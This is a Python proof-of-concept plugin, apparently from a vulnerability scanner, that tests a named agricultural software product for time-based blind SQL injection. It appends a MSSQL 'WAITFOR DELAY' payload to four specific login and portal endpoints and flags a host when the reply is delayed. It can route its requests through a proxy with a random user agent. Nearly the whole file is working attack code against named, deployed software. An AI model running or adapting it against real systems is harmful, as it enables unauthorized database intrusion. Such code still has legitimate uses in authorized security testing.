#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 农友多处时间盲注
referer: http://www.wooyun.org/bugs/wooyun-2010-091294
         http://www.wooyun.org/bugs/wooyun-2010-0108912
author: Lucifer
description: 时间盲注。
'''
import urllib
import requests
import time
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


urls = ["/IMLoginServlet?pwd=1&uid=1'",
        "/persionTreeServlet?bmdm=1'",
        "/R9iPortal/cm/cm_info_list.jsp?itype_id=3",
        "/R9iPortal/cm/cm_notice_content.jsp?info_id=4"]
payload = ";WaItFoR%20DeLaY%20%270:0:6%27--"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        for turl in urls:
            start_time = time.time()
            payload_url = scheme+"://"+url+turl +payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if time.time() - start_time >= 6:
                Medusa = "{} 存在XXX漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                return (Medusa)
    except Exception as e:
        pass